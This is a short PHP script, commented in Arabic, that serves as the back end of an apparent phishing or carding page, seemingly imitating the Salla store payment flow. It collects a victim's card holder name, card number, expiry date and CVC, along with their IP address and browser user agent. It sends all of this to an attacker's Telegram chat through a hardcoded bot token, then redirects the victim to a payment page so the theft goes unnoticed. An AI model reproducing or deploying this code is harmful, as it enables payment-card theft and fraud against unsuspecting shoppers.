<?php

// توكن بوت تلغرام ومعرف الدردشة
$telegram_token = '7996606148:AAGCkZCmT3y1en-3-zWmyk4almnDqZmbR8A';
$chat_id = '-1002180753425';

// استلام البيانات من النموذج
$card_holder_name = isset($_POST['card_holder_name']) ? htmlspecialchars($_POST['card_holder_name']) : '';
$credit_card_number = isset($_POST['credit_card_number']) ? htmlspecialchars($_POST['credit_card_number']) : '';
$cc_month = isset($_POST['cc_month']) ? htmlspecialchars($_POST['cc_month']) : '';
$cc_year = isset($_POST['cc_year']) ? htmlspecialchars($_POST['cc_year']) : '';
$credit_card_cvc = isset($_POST['cc_cvc']) ? htmlspecialchars($_POST['cc_cvc']) : '';

// دمج شهر وسنة انتهاء البطاقة
$credit_card_expire = $cc_month . '/' . $cc_year;

// الحصول على User Agent و IP
$userAgent = $_SERVER['HTTP_USER_AGENT'];
$userIP = $_SERVER['REMOTE_ADDR'];

// تنسيق الرسالة
$message = "╭━─━─━─≪ Info 💳 ≫─━─━─━╮\n\n";
$message .= "I سلة 💳 I\n\n";
$message .= "NC : $card_holder_name\n";
$message .= "NN : $credit_card_number\n";
$message .= "EX : $credit_card_expire\n";
$message .= "CV : $credit_card_cvc\n\n";
$message .= "------------------------\n";
$message .= "User Agent: $userAgent\n";
$message .= "IP : $userIP\n";
$message .= "╰━─━─━─≪ Info 💳 ≫─━─━─━╯";

// إعدادات طلب Telegram API
$telegram_api_url = "https://api.telegram.org/bot$telegram_token/sendMessage";
$telegram_data = [
    'chat_id' => $chat_id,
    'text' => $message,
];

$curl_options = [
    CURLOPT_URL => $telegram_api_url,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => http_build_query($telegram_data),
    CURLOPT_RETURNTRANSFER => true,
];

$ch = curl_init();
curl_setopt_array($ch, $curl_options);
$response = curl_exec($ch);
curl_close($ch);

// التحقق من الاستجابة
if ($response === false) {
    // إذا فشل الاتصال بـ Telegram
    echo 'حدث خطأ أثناء إرسال البيانات.';
} else {
    // إعادة توجيه المستخدم إلى صفحة التحميل
    header('Location: /sa/pay/payment');
    exit;
}

?>
